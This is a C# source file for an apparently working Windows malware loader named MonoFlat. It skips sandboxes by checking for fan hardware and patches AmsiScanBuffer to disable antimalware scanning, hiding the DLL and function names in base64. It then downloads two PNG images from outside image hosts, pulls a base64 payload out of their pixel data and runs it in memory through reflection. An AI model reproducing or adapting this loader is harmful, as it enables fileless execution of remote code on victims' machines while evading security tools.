using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace MonoFlat
{
    [StandardModule]
    public sealed class Module1
    {
        public static void Main()
        {
            if (!isVM_by_wim_temper()) { Load(); }
        }

        [DllImport("kernel32.dll")]
        private static extern int VirtualAllocExNuma(IntPtr hProcess, int lpAddress, int dwSize, int flAllocationType, int flProtect, int nndPreferred);


        public static bool isVM_by_wim_temper()
        {
            SelectQuery selectQuery = new SelectQuery("Select * from Win32_Fan");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(selectQuery);
            int i = 0;
            foreach (ManagementObject DeviceID in searcher.Get())
            {
                i++;
            }
            if (i == 0)
            {
                return true;
            }
            else
            {
                return false;
            }

        }
        public static byte[] depixelate(Bitmap img)
        {
            StringBuilder holder = new StringBuilder();
            int xmax = img.Width - 1;
            int ymax = img.Height - 1;
            for (int y = 1; y <= ymax; y++)
            {
                for (int x = 1; x <= xmax; x++)
                {
                    Color c = img.GetPixel(x, y);
                    holder.Append((char)c.R);
                }
            }

            return Convert.FromBase64String(holder.ToString().Replac​e(Convert.ToChar(0).ToString(), ""));
        }
        private static void Load()
        {
            Amsi.Bypass();

            object mem = VirtualAllocExNuma(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, 1000, 0x00002000 | 0x00001000, 0x40, 0);

            if (mem != null)
            {

                Console.WriteLine("Downloading files...");

                //string loader = @"http://i.imgur.com/y66QVE2.png"; // No Startup,Global
                string loader = @"https://s1.ax1x.com/2020/04/28/J4Zp9S.png"; // No Startup，CHINA
                string file = @"https://z3.ax1x.com/2021/03/29/cCXQtf.png"; //File
                var requestLoader = WebRequest.Create(loader);
                var requestFile = WebRequest.Create(file);
                Bitmap loaderIMG;
                Bitmap fileIMG;

                Console.WriteLine("Downloading Loader...");
                using (var response = requestLoader.GetResponse())
                using (var stream = response.GetResponseStream())
                {
                    loaderIMG = (Bitmap)Image.FromStream(stream);
                }

                Console.WriteLine("Downloading File...");
                using (var response = requestFile.GetResponse())
                using (var stream = response.GetResponseStream())
                {
                    fileIMG = (Bitmap)Image.FromStream(stream);
                }

                Console.WriteLine("Depixelating...");

                Console.WriteLine("Depixelating Loader...");
                byte[] outputLoader = depixelate(loaderIMG);

                Console.WriteLine("Depixelating File...");
                byte[] outputFile = depixelate(fileIMG);

                Console.WriteLine("Running...");
                System.Reflection.Assembly.Load(outputLoader).GetType("Loader.Loader").GetMethod("RunProgram").Invoke(null, new object[] { outputFile });
            }
        }
    }

    public class Amsi
    {
        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        public static void Bypass()
        {
            if (is64Bit())
                PatchAmsi(x64);
            else
                PatchAmsi(x86);
        }

        private static void PatchAmsi(byte[] patch)
        {
            try
            {
                var lib = Win32.LoadLibrary(Encoding.Default.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));//amsi.dll
                var addr = Win32.GetProcAddress(lib, Encoding.Default.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));//AmsiScanBuffer

                uint oldProtect;
                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, addr, patch.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }

        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
    }

    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
}